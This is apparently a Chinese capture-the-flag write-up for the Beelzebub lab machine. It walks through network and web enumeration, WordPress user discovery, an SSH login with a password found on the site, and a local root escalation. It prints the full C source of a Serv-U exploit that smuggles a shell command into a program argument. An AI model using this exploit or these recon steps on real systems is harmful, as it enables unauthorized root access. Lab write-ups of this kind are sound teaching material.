# Beelzebub

---

## 目录

[TOC]

---

## 信息收集

### 主机探测

```shell
┌──(root㉿kali)-[~/Desktop/Program]
└─# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:fd:3f:9b, IPv4: 192.168.3.132
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.3.1     dc:73:85:55:34:e8       Huawei Device Co., Ltd.
192.168.3.5     b4:0e:de:13:86:ed       Intel Corporate
192.168.3.12    8c:c6:81:18:15:14       Intel Corporate
192.168.3.7     70:8f:47:e4:3b:9f       vivo Mobile Communication Co., Ltd.
192.168.3.10    e2:cb:78:6b:40:b6       (Unknown: locally administered)
192.168.3.95    00:e2:69:65:a2:29       (Unknown)
192.168.3.116   00:0c:29:f5:8d:f0       VMware, Inc.
192.168.3.134   00:0c:29:1e:ed:5f       VMware, Inc.
192.168.3.121   9e:7b:0a:02:b6:39       (Unknown: locally administered)
192.168.3.36    b2:4f:a4:e9:90:97       (Unknown: locally administered)
192.168.3.39    ce:7b:b3:cd:c7:13       (Unknown: locally administered)

┌──(root㉿kali)-[/tmp/bell]
└─# nmap -A 192.168.3.134   
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-05 00:47 EDT
Nmap scan report for 192.168.3.134
Host is up (0.00029s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 20d1ed84cc68a5a786f0dab8923fd967 (RSA)
|   256 7889b3a2751276922af98d27c108a7b9 (ECDSA)
|_  256 b8f4d661cf1690c5071899b07c70fdc0 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 00:0C:29:1E:ED:5F (VMware)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

>  本机IP：`192.168.3.116`

> 靶机IP：`192.168.3.134`

> 服务/端口：`http:80(Apache httpd 2.4.29) | ssh:22`



---

### 目录扫描

```shell
┌──(root㉿kali)-[/tmp/bell]
└─# dirsearch -u http://192.168.3.134/
[00:44:49] 403 -  278B  - /.ht_wsr.txt                                      
[00:44:49] 403 -  278B  - /.htaccess.orig                                   
[00:44:49] 403 -  278B  - /.htaccess.bak1
[00:44:49] 403 -  278B  - /.htaccess.sample                                 
[00:44:49] 403 -  278B  - /.htaccess.save
[00:44:49] 403 -  278B  - /.htaccess_orig
[00:44:49] 403 -  278B  - /.htaccess_extra                                  
[00:44:49] 403 -  278B  - /.htaccess_sc                                     
[00:44:49] 403 -  278B  - /.htaccessBAK
[00:44:49] 403 -  278B  - /.htaccessOLD2
[00:44:49] 403 -  278B  - /.htm                                             
[00:44:49] 403 -  278B  - /.html                                            
[00:44:49] 403 -  278B  - /.htaccessOLD                                     
[00:44:49] 403 -  278B  - /.htpasswds                                       
[00:44:49] 403 -  278B  - /.httr-oauth
[00:44:49] 403 -  278B  - /.htpasswd_test
[00:44:50] 403 -  278B  - /.php                                             
[00:45:10] 200 -  221B  - /index.php                                        
[00:45:11] 200 -  221B  - /index.php/login/                                 
[00:45:11] 301 -  319B  - /javascript  ->  http://192.168.3.134/javascript/ 
[00:45:18] 200 -   24KB - /phpinfo.php                                      
[00:45:18] 301 -  319B  - /phpmyadmin  ->  http://192.168.3.134/phpmyadmin/ 
[00:45:19] 200 -    3KB - /phpmyadmin/doc/html/index.html                   
[00:45:19] 200 -    3KB - /phpmyadmin/                                      
[00:45:19] 200 -    3KB - /phpmyadmin/index.php
[00:45:22] 403 -  278B  - /server-status                                    
[00:45:22] 403 -  278B  - /server-status/
```

发现一个index.php，进去看看

```html

<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<!--My heart was encrypted, "beelzebub" somehow hacked and decoded it.-md5-->
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.30 (Ubuntu)</address>
</body></html>
```

首先此处是一个报错，但是这里实际上是作者写的静态页面，破绽点是`Apache/2.4.30 (Ubuntu)`，在上一步可知阿帕奇版本是`Apache httpd 2.4.29`，所以这里`Ctrl+U`进来看到一行注释，对`beelzebub`MD5一下得到`d18e1e22becbd915b45e0e655429d487 `，尝试作为目录扫描一下

```shell
┌──(root㉿kali)-[/tmp/bell]
└─# dirsearch -u http://192.168.3.134/d18e1e22becbd915b45e0e655429d487/

[00:56:49] Starting: d18e1e22becbd915b45e0e655429d487/                                                                                                                
[00:56:51] 403 -  278B  - /d18e1e22becbd915b45e0e655429d487/.ht_wsr.txt     
[00:56:51] 403 -  278B  - /d18e1e22becbd915b45e0e655429d487/.htaccess.orig  
[00:56:51] 403 -  278B  - /d18e1e22becbd915b45e0e655429d487/.htaccess_extra
[00:56:51] 403 -  278B  - /d18e1e22becbd915b45e0e655429d487/.htaccess.sample
[00:56:51] 403 -  278B  - /d18e1e22becbd915b45e0e655429d487/.htaccess_orig
[00:56:51] 403 -  278B  - /d18e1e22becbd915b45e0e655429d487/.htaccess.save
[00:56:51] 403 -  278B  - /d18e1e22becbd915b45e0e655429d487/.htaccess_sc
[00:56:51] 403 -  278B  - /d18e1e22becbd915b45e0e655429d487/.htaccess.bak1
[00:56:51] 403 -  278B  - /d18e1e22becbd915b45e0e655429d487/.htaccessOLD2
[00:56:51] 403 -  278B  - /d18e1e22becbd915b45e0e655429d487/.htaccessOLD    
[00:56:51] 403 -  278B  - /d18e1e22becbd915b45e0e655429d487/.htaccessBAK    
[00:56:51] 403 -  278B  - /d18e1e22becbd915b45e0e655429d487/.htm
[00:56:51] 403 -  278B  - /d18e1e22becbd915b45e0e655429d487/.html
[00:56:51] 403 -  278B  - /d18e1e22becbd915b45e0e655429d487/.htpasswd_test  
[00:56:51] 403 -  278B  - /d18e1e22becbd915b45e0e655429d487/.htpasswds
[00:56:51] 403 -  278B  - /d18e1e22becbd915b45e0e655429d487/.httr-oauth     
[00:56:52] 403 -  278B  - /d18e1e22becbd915b45e0e655429d487/.php            
[00:57:10] 200 -   19KB - /d18e1e22becbd915b45e0e655429d487/index.php       
[00:57:10] 404 -   55KB - /d18e1e22becbd915b45e0e655429d487/index.php/login/
[00:57:12] 200 -    7KB - /d18e1e22becbd915b45e0e655429d487/license.txt     
[00:57:19] 200 -    3KB - /d18e1e22becbd915b45e0e655429d487/readme.html     
[00:57:28] 301 -  350B  - /d18e1e22becbd915b45e0e655429d487/wp-admin  ->  http://192.168.3.134/d18e1e22becbd915b45e0e655429d487/wp-admin/
[00:57:28] 500 -    3KB - /d18e1e22becbd915b45e0e655429d487/wp-admin/setup-config.php
[00:57:28] 400 -    1B  - /d18e1e22becbd915b45e0e655429d487/wp-admin/admin-ajax.php
[00:57:28] 302 -    0B  - /d18e1e22becbd915b45e0e655429d487/wp-admin/  ->  http://192.168.1.6/d18e1e22becbd915b45e0e655429d487/wp-login.php?redirect_to=http%3A%2F%2F192.168.3.134%2Fd18e1e22becbd915b45e0e655429d487%2Fwp-admin%2F&reauth=1
[00:57:28] 200 -    0B  - /d18e1e22becbd915b45e0e655429d487/wp-config.php   
[00:57:28] 200 -  580B  - /d18e1e22becbd915b45e0e655429d487/wp-admin/install.php
[00:57:28] 301 -  352B  - /d18e1e22becbd915b45e0e655429d487/wp-content  ->  http://192.168.3.134/d18e1e22becbd915b45e0e655429d487/wp-content/
[00:57:28] 200 -    0B  - /d18e1e22becbd915b45e0e655429d487/wp-content/     
[00:57:28] 200 -   84B  - /d18e1e22becbd915b45e0e655429d487/wp-content/plugins/akismet/akismet.php
[00:57:29] 500 -    0B  - /d18e1e22becbd915b45e0e655429d487/wp-content/plugins/hello.php
[00:57:29] 200 -  445B  - /d18e1e22becbd915b45e0e655429d487/wp-content/upgrade/
[00:57:29] 200 -  517B  - /d18e1e22becbd915b45e0e655429d487/wp-content/uploads/
[00:57:29] 301 -  353B  - /d18e1e22becbd915b45e0e655429d487/wp-includes  ->  http://192.168.3.134/d18e1e22becbd915b45e0e655429d487/wp-includes/
[00:57:29] 200 -    4KB - /d18e1e22becbd915b45e0e655429d487/wp-includes/    
[00:57:29] 200 -    0B  - /d18e1e22becbd915b45e0e655429d487/wp-cron.php
[00:57:29] 200 -    2KB - /d18e1e22becbd915b45e0e655429d487/wp-login.php    
[00:57:29] 500 -    0B  - /d18e1e22becbd915b45e0e655429d487/wp-includes/rss-functions.php
[00:57:29] 302 -    0B  - /d18e1e22becbd915b45e0e655429d487/wp-signup.php  ->  http://192.168.1.6/d18e1e22becbd915b45e0e655429d487/wp-login.php?action=register
[00:57:29] 405 -   42B  - /d18e1e22becbd915b45e0e655429d487/xmlrpc.php      
                                                                             
Task Completed
```

发现是`WordPress`，访问一下`index.php`，发现一个疑似用户名`ValAk`

再访问一下`/wp-content/uploads/`，发现一个可疑的页面`Talk to ValAk`，点击发送后获得`Cookie password: M4k3Ad3a1`

尝试将其作为ssh连接密码，失败了



---

## 渗透

### WordPress扫描【wpscan】

```shell
┌──(root㉿kali)-[/tmp/bell]
└─# wpscan --url http://192.168.3.134/d18e1e22becbd915b45e0e655429d487/ --ignore-main-redirect --force  -e --plugins-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.3.134/d18e1e22becbd915b45e0e655429d487/ [192.168.3.134]
[+] Started: Sun Jun  4 22:43:53 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.29 (Ubuntu)
 |  - X-Redirect-By: WordPress
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.3.134/d18e1e22becbd915b45e0e655429d487/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.3.134/d18e1e22becbd915b45e0e655429d487/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.3.134/d18e1e22becbd915b45e0e655429d487/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.3.134/d18e1e22becbd915b45e0e655429d487/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.3.6 identified (Insecure, released on 2020-10-30).
 | Found By: Atom Generator (Aggressive Detection)
 |  - http://192.168.3.134/d18e1e22becbd915b45e0e655429d487/index.php/feed/atom/, <generator uri="https://wordpress.org/" version="5.3.6">WordPress</generator>
 | Confirmed By: Style Etag (Aggressive Detection)
 |  - http://192.168.3.134/d18e1e22becbd915b45e0e655429d487/wp-admin/load-styles.php, Match: '5.3.6'

[i] The main theme could not be detected.

[+] Enumerating Vulnerable Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:00:17 <==========================================================================================================================================================> (5687 / 5687) 100.00% Time: 00:00:17

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:54 <============================================================================================================================================================> (500 / 500) 100.00% Time: 00:00:54

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:03 <==========================================================================================================================================================> (2568 / 2568) 100.00% Time: 00:00:03

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:01 <=============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:01

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:00 <===================================================================================================================================================================> (71 / 71) 100.00% Time: 00:00:00

[i] No DB Exports Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:00 <========================================================================================================================================================> (100 / 100) 100.00% Time: 00:00:00

[i] Medias(s) Identified:

[+] http://192.168.3.134/d18e1e22becbd915b45e0e655429d487/?attachment_id=39
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://192.168.3.134/d18e1e22becbd915b45e0e655429d487/?attachment_id=38
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://192.168.3.134/d18e1e22becbd915b45e0e655429d487/?attachment_id=42
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://192.168.3.134/d18e1e22becbd915b45e0e655429d487/?attachment_id=44
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://192.168.3.134/d18e1e22becbd915b45e0e655429d487/?attachment_id=48
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://192.168.3.134/d18e1e22becbd915b45e0e655429d487/?attachment_id=51
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://192.168.3.134/d18e1e22becbd915b45e0e655429d487/?attachment_id=49
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://192.168.3.134/d18e1e22becbd915b45e0e655429d487/?attachment_id=74
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://192.168.3.134/d18e1e22becbd915b45e0e655429d487/?attachment_id=75
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://192.168.3.134/d18e1e22becbd915b45e0e655429d487/?attachment_id=77
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://192.168.3.134/d18e1e22becbd915b45e0e655429d487/?attachment_id=96
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://192.168.3.134/d18e1e22becbd915b45e0e655429d487/?attachment_id=99
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==============================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] valak
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] krampus
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Jun  4 22:46:30 2023
[+] Requests Done: 9113
[+] Cached Requests: 15
[+] Data Sent: 3.004 MB
[+] Data Received: 1.377 MB
[+] Memory used: 187 MB
[+] Elapsed time: 00:02:36

```

发现另一个用户名`krampus`，尝试将其作为用户名，密码`M4k3Ad3a1`连接ssh

```shell
┌──(root㉿kali)-[/tmp/bell]
└─# ssh krampus@192.168.3.134                                          
krampus@192.168.3.134's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.3.0-53-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

509 packages can be updated.
382 updates are security updates.

New release '20.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Your Hardware Enablement Stack (HWE) is supported until April 2023.
Last login: Mon Jun  5 08:33:59 2023 from 192.168.3.132
krampus@beelzebub:~$
```

成功



---

### 提权

`sudo -l`发现没有可用的指令

`ls /etc/passwd -l` 发现无法修改该文件

`ps -aux` 没有看到明显可pwn的后台程序

```shell
history
   64  wget https://www.exploit-db.com/download/47009
   65  clear
   66  ls
   67  clear
   68  mv 47009 ./exploit.c
   69  gcc exploit.c -o exploit
   70  ./exploit
```

发现有一个exp，根据历史记录再来一次，成功提权

```shell
krampus@beelzebub:~$ ./exploit 
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(krampus)
opening root shell
# whoami
root
# 
```

### Exp程序

```C
#include <stdio.h>
#include <unistd.h>
#include <errno.h>

int main()
{       
    char *vuln_args[] = {"\" ; id; echo 'opening root shell' ; /bin/sh; \"", "-prepareinstallation", NULL};
    int ret_val = execv("/usr/local/Serv-U/Serv-U", vuln_args);
    // if execv is successful, we won't reach here
    printf("ret val: %d errno: %d\n", ret_val, errno);
    return errno;
}
```



---

## 总结

- 做题的时候，一些版本信息要记录下来，别光看一眼

- 一些特别的页面常`Ctrl U`看一眼有没有注释或者隐藏了什么